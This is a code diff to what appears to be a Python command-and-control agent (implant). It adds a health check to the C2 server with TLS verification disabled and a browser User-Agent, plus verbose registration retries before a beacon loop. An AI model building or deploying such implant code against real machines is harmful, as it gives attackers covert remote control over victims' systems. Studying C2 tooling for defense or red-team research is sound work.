@@ -64,6 +64,25 @@ def get_internal_ip():
     except Exception:
         return "127.0.0.1"
 
+def check_server_health(c2_url=None, timeout=5):
+    """Check if C2 server is reachable and responding."""
+    c2_url = c2_url or C2_URL
+    try:
+        ctx = ssl.create_default_context()
+        ctx.check_hostname = False
+        ctx.verify_mode = ssl.CERT_NONE
+        opener = build_opener(HTTPSHandler(context=ctx))
+        req = Request(f"{c2_url}/api/health", headers={"User-Agent": "Mozilla/5.0"})
+        resp = opener.open(req, timeout=timeout)
+        data = json.loads(resp.read())
+        return True, data
+    except URLError as e:
+        return False, f"Connection failed: {e.reason}"
+    except socket.timeout:
+        return False, "Connection timeout"
+    except Exception as e:
+        return False, f"Error: {type(e).__name__}: {e}"
+
 def http_post(path, data, c2_url=None, auth_token=None, enc_key=None):
     c2_url = c2_url or C2_URL
     auth_token = auth_token or AUTH_TOKEN
@@ -363,16 +382,43 @@ def main():
     import random
     print(f"[C2 Agent] Platform: {detect_platform()}")
     print(f"[C2 Agent] C2 URL: {C2_URL}")
+    print(f"[C2 Agent] Agent ID: {AGENT_ID}")
     
-    # Register with retry
+    # Check server health first
+    print(f"[C2 Agent] Checking server connectivity...")
+    ok, result = check_server_health()
+    if ok:
+        print(f"[C2 Agent] Server OK: {result}")
+    else:
+        print(f"[C2 Agent] Server check failed: {result}")
+        print(f"[C2 Agent] Troubleshooting:")
+        print(f"  - Is the server running? (sysmon --host 0.0.0.0 --port 5000)")
+        print(f"  - Is C2_URL correct? Currently: {C2_URL}")
+        print(f"  - Is the port reachable? (firewall/network)")
+        print(f"  - For HTTPS: check certificate")
+    
+    # Register with retry and detailed error
+    retry_count = 0
     while True:
+        retry_count += 1
         try:
             register()
-            print(f"[C2 Agent] Registered: {AGENT_ID}")
+            print(f"[C2 Agent] Registered successfully: {AGENT_ID}")
             break
+        except URLError as e:
+            print(f"[C2 Agent] [{retry_count}] Connection error: {e.reason}")
+            if "Connection refused" in str(e.reason):
+                print(f"  -> Server not running or wrong port")
+            elif "timed out" in str(e.reason).lower():
+                print(f"  -> Network unreachable or firewall blocking")
+        except socket.timeout:
+            print(f"[C2 Agent] [{retry_count}] Socket timeout - server not responding")
         except Exception as e:
-            print(f"[C2 Agent] Registration failed: {e}, retrying...")
-            time.sleep(10)
+            print(f"[C2 Agent] [{retry_count}] Registration failed: {type(e).__name__}: {e}")
+        
+        if retry_count % 5 == 0:
+            print(f"[C2 Agent] Still trying... (attempt {retry_count})")
+        time.sleep(10)
     
     # Start beacon loop
     beacon_loop()
